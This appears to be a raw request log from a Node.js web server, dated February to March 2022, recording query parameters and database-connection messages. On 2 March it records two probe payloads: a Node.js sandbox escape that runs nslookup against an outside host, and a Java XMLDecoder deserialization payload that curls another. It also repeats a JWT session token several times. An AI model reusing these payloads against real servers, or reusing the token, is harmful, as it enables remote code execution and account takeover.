[2022-02-23T12:45:45.505] [INFO] info - get params:{}
[2022-02-23T12:45:45.506] [INFO] info - post params:{"token":""}
[2022-02-23T12:45:46.414] [INFO] info - get params:{"page":"1","count":"4","category_id":"0","type":"0"}
[2022-02-23T12:45:46.415] [INFO] info - post params:{}
[2022-02-23T12:45:46.631] [INFO] info - get params:{}
[2022-02-23T12:45:46.631] [INFO] info - post params:{}
[2022-02-23T12:45:56.834] [INFO] info - get params:{}
[2022-02-23T12:45:56.834] [INFO] info - post params:{}
[2022-02-23T12:46:00.750] [INFO] info - get params:{}
[2022-02-23T12:46:00.750] [INFO] info - post params:{"key":"0"}
[2022-02-23T12:47:19.114] [INFO] info - ***数据库连接成功***
[2022-02-23T12:47:28.731] [INFO] info - get params:{}
[2022-02-23T12:47:28.732] [INFO] info - post params:{}
[2022-02-23T12:47:32.375] [INFO] info - get params:{}
[2022-02-23T12:47:32.375] [INFO] info - post params:{"key":"0"}
[2022-02-23T13:02:38.520] [INFO] info - ***数据库连接成功***
[2022-02-23T13:02:44.895] [INFO] info - get params:{}
[2022-02-23T13:02:44.895] [INFO] info - post params:{}
[2022-02-23T13:02:48.157] [INFO] info - get params:{}
[2022-02-23T13:02:48.157] [INFO] info - post params:{"key":"0"}
[2022-02-23T13:03:24.231] [INFO] info - get params:{}
[2022-02-23T13:03:24.231] [INFO] info - post params:{"token":""}
[2022-03-02T20:24:41.311] [INFO] info - ***数据库连接成功***
[2022-03-02T20:24:45.998] [INFO] info - get params:{}
[2022-03-02T20:24:45.998] [INFO] info - post params:{"document":"this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"nslookup zscrsb.s0x.cn\")"}
[2022-03-02T20:24:47.155] [INFO] info - get params:{"method":"editParam","fdParemNames":"11","FdParameters":"<?xml version=\"1.0\" encoding=\"UTF-8\"?> <java version=\"1.7.0_21\" class=\"java.beans.XMLDecoder\"> <void class=\"java.lang.ProcessBuilder\"> <array class=\"java.lang.String\" length=\"2\"><void index=\"0\"><string>curl</string></void><void index=\"1\"><string>q1xqs5.s0x.cn</string></void></array> <void method=\"start\" id=\"process\"> </void> </void> </java>"}
[2022-03-02T20:24:47.156] [INFO] info - post params:{}
[2022-03-02T20:28:03.318] [INFO] info - ***数据库连接成功***
[2022-03-02T20:34:07.079] [INFO] info - get params:{}
[2022-03-02T20:34:07.079] [INFO] info - post params:{}
[2022-03-02T20:49:43.880] [INFO] info - get params:{}
[2022-03-02T20:49:43.880] [INFO] info - post params:{}
[2022-03-02T20:49:43.901] [INFO] info - get params:{}
[2022-03-02T20:49:43.901] [INFO] info - post params:{}
[2022-03-02T20:54:27.073] [INFO] info - get params:{}
[2022-03-02T20:54:27.074] [INFO] info - post params:{}
[2022-03-02T21:04:31.339] [INFO] info - get params:{}
[2022-03-02T21:04:31.339] [INFO] info - post params:{}
[2022-03-02T21:12:05.019] [INFO] info - get params:{}
[2022-03-02T21:12:05.019] [INFO] info - post params:{}
[2022-03-02T21:18:38.336] [INFO] info - get params:{}
[2022-03-02T21:18:38.336] [INFO] info - post params:{}
[2022-03-02T21:22:38.799] [INFO] info - get params:{}
[2022-03-02T21:22:38.799] [INFO] info - post params:{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImtleSI6IjRhZjBmZGJmLTY5ODEtNGIwMS1iZTk0LTAyZmI4MjE3YzQ1OSIsIm9wZW5pZCI6Im8wOWZrNUVTcTZvVUlxTDJxb2llbHhJeDdHQWciLCJpZCI6OX0sImlhdCI6MTY0NTcxMTEzMCwiZXhwIjoxNjQ2MzE1OTMwfQ.x5-ktwEcRiorab_KnZYCg809I_xU7FyCe5TE1qv-GnU"}
[2022-03-02T21:22:39.678] [INFO] info - get params:{}
[2022-03-02T21:22:39.678] [INFO] info - post params:{}
[2022-03-02T21:22:57.219] [INFO] info - get params:{}
[2022-03-02T21:22:57.219] [INFO] info - post params:{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImtleSI6IjRhZjBmZGJmLTY5ODEtNGIwMS1iZTk0LTAyZmI4MjE3YzQ1OSIsIm9wZW5pZCI6Im8wOWZrNUVTcTZvVUlxTDJxb2llbHhJeDdHQWciLCJpZCI6OX0sImlhdCI6MTY0NTcxMTEzMCwiZXhwIjoxNjQ2MzE1OTMwfQ.x5-ktwEcRiorab_KnZYCg809I_xU7FyCe5TE1qv-GnU"}
[2022-03-02T21:22:57.794] [INFO] info - get params:{}
[2022-03-02T21:22:57.795] [INFO] info - post params:{}
[2022-03-02T21:23:03.425] [INFO] info - get params:{"page":"1","count":"4","category_id":"0","type":"0"}
[2022-03-02T21:23:03.425] [INFO] info - post params:{}
[2022-03-02T21:23:03.684] [INFO] info - get params:{}
[2022-03-02T21:23:03.685] [INFO] info - post params:{}
[2022-03-02T21:23:06.745] [INFO] info - get params:{"page":"2","count":"4","category_id":"0","type":"0"}
[2022-03-02T21:23:06.745] [INFO] info - post params:{}
[2022-03-02T21:23:10.962] [INFO] info - get params:{}
[2022-03-02T21:23:10.962] [INFO] info - post params:{}
[2022-03-02T21:23:11.003] [INFO] info - get params:{}
[2022-03-02T21:23:11.003] [INFO] info - post params:{}
[2022-03-02T21:23:16.239] [INFO] info - get params:{}
[2022-03-02T21:23:16.239] [INFO] info - post params:{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImtleSI6IjRhZjBmZGJmLTY5ODEtNGIwMS1iZTk0LTAyZmI4MjE3YzQ1OSIsIm9wZW5pZCI6Im8wOWZrNUVTcTZvVUlxTDJxb2llbHhJeDdHQWciLCJpZCI6OX0sImlhdCI6MTY0NTcxMTEzMCwiZXhwIjoxNjQ2MzE1OTMwfQ.x5-ktwEcRiorab_KnZYCg809I_xU7FyCe5TE1qv-GnU"}
[2022-03-02T21:23:18.764] [INFO] info - get params:{}
[2022-03-02T21:23:18.764] [INFO] info - post params:{}
[2022-03-02T21:23:25.121] [INFO] info - get params:{}
[2022-03-02T21:23:25.121] [INFO] info - post params:{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImtleSI6IjRhZjBmZGJmLTY5ODEtNGIwMS1iZTk0LTAyZmI4MjE3YzQ1OSIsIm9wZW5pZCI6Im8wOWZrNUVTcTZvVUlxTDJxb2llbHhJeDdHQWciLCJpZCI6OX0sImlhdCI6MTY0NTcxMTEzMCwiZXhwIjoxNjQ2MzE1OTMwfQ.x5-ktwEcRiorab_KnZYCg809I_xU7FyCe5TE1qv-GnU"}
[2022-03-02T21:23:25.263] [INFO] info - get params:{"role":"1"}
[2022-03-02T21:23:25.264] [INFO] info - post params:{}
[2022-03-02T21:23:25.321] [INFO] info - get params:{"role":"2"}
[2022-03-02T21:23:25.321] [INFO] info - post params:{}
[2022-03-02T21:23:25.323] [INFO] info - get params:{"type":"1"}
[2022-03-02T21:23:25.323] [INFO] info - post params:{}
[2022-03-02T21:23:25.336] [INFO] info - get params:{"type":"2"}
[2022-03-02T21:23:25.336] [INFO] info - post params:{}
[2022-03-02T21:23:27.708] [INFO] info - get params:{}
[2022-03-02T21:23:27.708] [INFO] info - post params:{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImtleSI6IjRhZjBmZGJmLTY5ODEtNGIwMS1iZTk0LTAyZmI4MjE3YzQ1OSIsIm9wZW5pZCI6Im8wOWZrNUVTcTZvVUlxTDJxb2llbHhJeDdHQWciLCJpZCI6OX0sImlhdCI6MTY0NTcxMTEzMCwiZXhwIjoxNjQ2MzE1OTMwfQ.x5-ktwEcRiorab_KnZYCg809I_xU7FyCe5TE1qv-GnU"}
[2022-03-02T21:23:28.587] [INFO] info - get params:{}
[2022-03-02T21:23:28.587] [INFO] info - post params:{}
[2022-03-02T21:39:52.716] [INFO] info - get params:{}
[2022-03-02T21:39:52.716] [INFO] info - post params:{}
[2022-03-02T21:54:28.942] [INFO] info - get params:{}
[2022-03-02T21:54:28.942] [INFO] info - post params:{}
[2022-03-02T21:56:34.357] [INFO] info - ***数据库连接成功***
[2022-03-02T21:57:18.749] [INFO] info - ***数据库连接成功***
[2022-03-02T21:57:47.827] [INFO] info - ***数据库连接成功***
[2022-03-02T21:59:29.278] [INFO] info - ***数据库连接成功***
